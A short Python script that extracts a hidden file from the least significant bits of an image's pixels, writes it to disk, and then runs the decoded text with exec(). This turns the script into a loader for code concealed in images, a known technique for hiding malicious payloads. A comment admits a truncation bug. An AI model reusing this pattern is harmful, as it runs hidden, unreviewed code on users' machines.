from PIL import Image
import numpy as np


def import_image(filename):
    '''
    loads an image and returns a numpy array of the image
    param filename (str): name of the image to be loaded

    output (ndarray): 3D array of the image pixels (RGB)
    '''
    return np.array(Image.open(filename))


def decode_capacity(img_copy):
    '''
    extract length of secret file from the image
    param img_copy (ndarray): a 1d vector of the image (flattened)
    output (int): the length of the secret file embedded to this image
    '''
    
    # get the 2 lsb from the first 12 pixels (24 bits)
    bin_rep = ''.join([bits_representation(pixel)[-2:] for pixel in img_copy[:12]])
    # return it as an integer
    return int(bin_rep, 2)

def bits_representation(integer, n_bits=8):
    '''
    takes an integer and return its binary representaation
    param integer (int): The integer to be converted to binary
    param n_bits (int): number of total bits to return. Default is 8

    output (str): string which represents the bits of the integer value

    Example: bits_representation(3, 8) >> 00000011
    '''
    return ''.join(['{0:0',str(n_bits),'b}']).format(integer)


def decode_secret(flat_medium, sec_ext, length):        # KNOWN BUG: will leave out the last 3 chars, idk why
    '''
    Takes the image, length of hidden secret, and the extension of the output file,
    then extracts secret file bits from the image, executes the decoded Python code,
    and writes it to a new file with the specified extension.
    
    Parameters:
    - flat_medium (ndarray): A 1D vector of the image (flattened)
    - sec_ext (str): The file extension of the secret file. Example: 'txt'
    - length (int): The length of the secret file extracted using decode_capacity
    '''
    # Initialize a string to accumulate the decoded characters
    decoded_code = ""
    
    # Open the output file in write mode with UTF-8 encoding
    with open(f'secret.{sec_ext}', 'w', encoding="utf-8") as file:
        # Extract 1 byte at a time (2 bits from each of the 4 pixels)
        for pix_idx in range(12, len(flat_medium), 4):
            # Extract the last 2 bits from each of the 4 consecutive pixels
            byte_bits = ''.join([bits_representation(pixel)[-2:] for pixel in flat_medium[pix_idx:pix_idx+4]])
            
            # Convert the 8 bits to a character
            try:
                byte = int(byte_bits, 2)
                char = chr(byte)
            except ValueError as ve:
                print(f"Error converting bits to character at index {pix_idx}: {ve}")
                continue  # Skip invalid bytes
            
            # Accumulate the character to the decoded_code string
            decoded_code += char
            
            # Write the character to the output file
            file.write(char)
            
            # Check if we've reached the specified length
            if (pix_idx + 4) >= length:
                break
    
    # Execute the decoded Python code
    try:
        print("Executing the decoded Python code...")
        print(decoded_code)
        exec(decoded_code, {'__name__': '__main__'})
        print("Execution completed successfully.")
    except Exception as e:
        print(f"An error occurred while executing the decoded code: {e}")



def decode(stego_img, sec_ext, name):
    '''
    this is the driver function to decode a secret file from the stego image
    param stego_img(str): name of the stego image to extract secret from
    param sec_ext(str): the extension of the secret file
    output: a secret file with the specified extension
    '''
    # read image and flatten to 1D
    img = import_image(stego_img).flatten()

    # decode secret length from stego image
    secret_size = decode_capacity(img)
    print(f'secret size: {secret_size}')

    # extract secret file from stego image
    decode_secret(img, sec_ext, secret_size)

    # print(f'Decoding completed, "{name}.{sec_ext}" should be in your directory')


if __name__ == "__main__":
    # use example
    decode('out.png', 'py', "test_out")
